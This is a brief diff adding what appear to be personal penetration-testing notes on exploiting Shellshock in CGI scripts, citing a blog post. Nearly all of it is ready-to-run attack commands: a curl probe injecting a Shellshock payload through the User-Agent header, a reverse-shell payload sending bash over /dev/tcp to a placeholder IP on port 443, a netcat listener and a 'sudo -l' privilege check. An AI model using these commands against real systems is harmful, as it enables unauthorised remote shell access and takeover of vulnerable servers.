@@ -1,0 +1,14 @@
+https://antonyt.com/blog/2020-03-27/exploiting-cgi-scripts-with-shellshock
+
+# Test
+curl -H "User-agent: () { :;}; echo; echo vulnerable" http://localhost/cgi-bin/hello.sh
+
+# Reverse Shell
+curl -i -H "User-agent: () { :;}; /bin/bash -i >& /dev/tcp/xx.xx.xx.xx/443 0>&1" http://localhost/cgi-bin/hello.sh
+
+# Setting up Listener
+nc -nlvp 443
+
+# Check Permissions
+sudo -l
+
